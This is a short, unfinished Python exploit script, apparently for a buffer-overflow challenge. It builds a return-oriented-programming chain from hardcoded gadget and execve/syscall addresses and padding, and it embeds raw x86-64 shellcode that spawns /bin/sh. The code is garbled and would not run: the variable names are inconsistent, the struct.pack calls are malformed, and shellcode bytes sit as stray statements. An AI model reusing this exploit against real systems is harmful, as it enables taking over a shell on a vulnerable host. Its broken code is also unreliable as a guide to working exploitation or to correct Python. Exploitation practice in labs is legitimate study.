#!/usr/bin/env python

import sys
import struct

#0x7ffff7af1a60 <execve>
#break *0x7ffff7a57503
#Return PTR 0x7fffffffe238
#seg fault at 71 chars
#0x7ffff7af1a65 syscall


shellcode = "/bin/sh\x00"

roplist = []

#174 bytes to get to null space
junk_buff = "AAAAAAAAA"
for i in range(0,20):
	roplist.append(junk_buff)
roplist.append('<WH', "AAAAAA")

roplist.append(0x00000000004006d3) #pop rdi ; ret
roptlist.append(shellcode)
roptlist.append(0x00000000004006d1) #pop rsi ; pop r15 ; ret

roptlist.append(0x00007ffff7af1a60) #syscall


def x(roplist):
	struct_rop = [struct.pack('<Q,i') for i in roplist]
	return ''.join(struct)

	\x31\xc0\x48\xbb\xd1\x9d\x96\x91
\xd0\x8c\x97\xff\x48\xf7\xdb\x53
\x54\x5f\x99\x52\x57\x54\x5e\xb0
\x3b\x0f\x05


rop_chain = []

rop_chain.append()
